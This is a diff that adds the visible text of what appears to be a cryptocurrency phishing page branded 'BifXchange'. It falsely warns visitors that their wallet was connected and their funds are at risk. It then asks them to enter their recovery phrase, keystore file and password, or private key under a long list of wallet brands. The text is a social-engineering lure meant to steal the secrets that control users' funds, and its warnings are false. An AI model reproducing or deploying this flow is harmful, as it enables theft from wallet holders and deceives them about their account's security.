@@ -1,0 +1,80 @@
+Wallet Connection Manager - BifXchange
+X
+okay this a notification
+Back
+Authenticate your wallet manually
+Phrase
+Keystore JSON
+Private Key
+Typically 12 (sometimes 24) words seperated by a single spaces.
+PROCEED
+CANCEL
+Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+PROCEED
+CANCEL
+PROCEED
+CANCEL
+Initializing
+Authenticate Manually
+Authenticate
+BifXchange
+Home (current)
+Buy
+Sell
+Market
+Exchange easily
+Welcome to BifXchange
+Exchange
+Buy
+Sell
+All Crypto Assets
+Wallet Connection Manager
+Your wallet was recently connected to our exchange, if you didn't do so, disconnect your wallet below to avoid loss of funds!
+DISCONNECT YOUR WALLET (***)
+REVOKE PERMISSIONS
+CANCEL
+Select Wallet to Continue
+×
+Metamask
+TrustWallet
+Coin98
+Blockchain
+Bitpie
+Binance Smart Chain
+Crypto.com Wallet
+Gnosis
+Coinbase
+Alice
+Alpha
+AToken
+Bitkeep
+Bitpay
+Bridge
+CentWallet
+Coinomi
+Coolwallet
+Cybavo
+Defiant
+Dok
+EasyPocket
+Eidoo
+Flare
+GridPlus
+Guarda
+Halo Defi
+Huobi
+Infinitio
+Infinity
+Keeplr
+Nash
+Onto
+Ownbit
+Peakdefi
+RWallet
+Safepal
+Spatium
+Talken
+Tokenary
+Unstoppable
+Viawallet
+Close
